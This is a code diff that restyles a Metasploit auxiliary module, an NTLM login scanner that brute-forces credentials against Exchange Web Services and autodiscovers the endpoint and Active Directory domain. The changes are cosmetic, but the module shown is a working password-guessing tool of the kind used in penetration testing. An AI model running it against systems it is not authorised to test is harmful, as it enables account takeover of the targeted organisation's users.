@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -9,7 +10,6 @@ require 'rex/proto/http'
 require 'metasploit/framework/credential_collection'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'           => 'OWA Exchange Web Services (EWS) Login Scanner',
-      'Description'    => %q{
+      'Description'    => %q(
         This module attempts to log in to the Exchange Web Services, often
         exposed at https://example.com/ews/, using NTLM authentication. This
         method is faster and simpler than traditional form-based logins.
@@ -25,7 +25,7 @@ class MetasploitModule < Msf::Auxiliary
         In most cases, all you need to set is RHOSTS and some combination of
         user/pass files; the autodiscovery should find the location of the NTLM
         authentication point as well as the AD domain, and use them accordingly.
-      },
+      ),
       'Author'         => 'Rich Whitcroft',
       'License'        => MSF_LICENSE,
       'DefaultOptions' => { 'SSL' => true, 'VERBOSE' => false }
@@ -37,12 +37,13 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('AD_DOMAIN', [ false, "The Active Directory domain name", nil ]),
         OptString.new('TARGETURI', [ false, "The location of the NTLM service", nil ]),
         Opt::RPORT(443)
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run_host(ip)
     cli = Rex::Proto::Http::Client.new(datastore['RHOSTS'], datastore['RPORT'], {}, datastore['SSL'], datastore['SSLVersion'], nil, '', '')
-    cli.set_config({ 'preferred_auth' => 'NTLM' })
+    cli.set_config('preferred_auth' => 'NTLM')
     cli.connect
 
     domain = nil
@@ -65,7 +66,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    cli.set_config({ 'domain' => domain })
+    cli.set_config('domain' => domain)
 
     creds = Metasploit::Framework::CredentialCollection.new(
       blank_passwords: datastore['BLANK_PASSWORDS'],
@@ -79,12 +80,10 @@ class MetasploitModule < Msf::Auxiliary
 
     creds.each do |cred|
       begin
-        req = cli.request_raw({
-          'uri' => uri,
-          'method' => 'GET',
-          'username' => cred.public,
-          'password' => cred.private
-        })
+        req = cli.request_raw('uri' => uri,
+                              'method' => 'GET',
+                              'username' => cred.public,
+                              'password' => cred.private)
 
         res = cli.send_recv(req)
       rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
@@ -93,7 +92,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       if res.code != 401
-        print_brute :level => :good, :ip => ip, :msg => "Successful login: #{cred.to_s}"
+        print_brute level: :good, ip: ip, msg: "Successful login: #{cred}"
         report_cred(
           ip: ip,
           port: datastore['RPORT'],
@@ -104,21 +103,19 @@ class MetasploitModule < Msf::Auxiliary
 
         return if datastore['STOP_ON_SUCCESS']
       else
-        vprint_brute :level => :verror, :ip => ip, :msg => "Failed login: #{cred.to_s}"
+        vprint_brute level: :verror, ip: ip, msg: "Failed login: #{cred}"
       end
     end
   end
 
   def autodiscover(cli)
-    uris = %w[ /ews/ /rpc/ /public/ ]
+    uris = %w(/ews/ /rpc/ /public/)
     uris.each do |uri|
       begin
-        req = cli.request_raw({
-          'encode'   => true,
-          'uri'      => uri,
-          'method'   => 'GET',
-          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
-        })
+        req = cli.request_raw('encode' => true,
+                              'uri'      => uri,
+                              'method'   => 'GET',
+                              'headers' => { 'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==' })
 
         res = cli.send_recv(req)
       rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
@@ -131,14 +128,13 @@ class MetasploitModule < Msf::Auxiliary
         next
       end
 
-      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
-        hash = res['WWW-Authenticate'].split('NTLM ')[1]
-        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\0/,'')
-        return domain, uri
-      end
+      next unless res && res.code == 401 && res.headers.key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
+      hash = res['WWW-Authenticate'].split('NTLM ')[1]
+      domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value.gsub(/\0/, '')
+      return domain, uri
     end
 
-    return nil, nil
+    [nil, nil]
   end
 
   def report_cred(opts)
@@ -161,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
     login_data = {
       core: create_credential(credential_data),
       last_attempted_at: DateTime.now,
-      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      status: Metasploit::Model::Login::Status::SUCCESSFUL
     }.merge(service_data)
 
     create_credential_login(login_data)
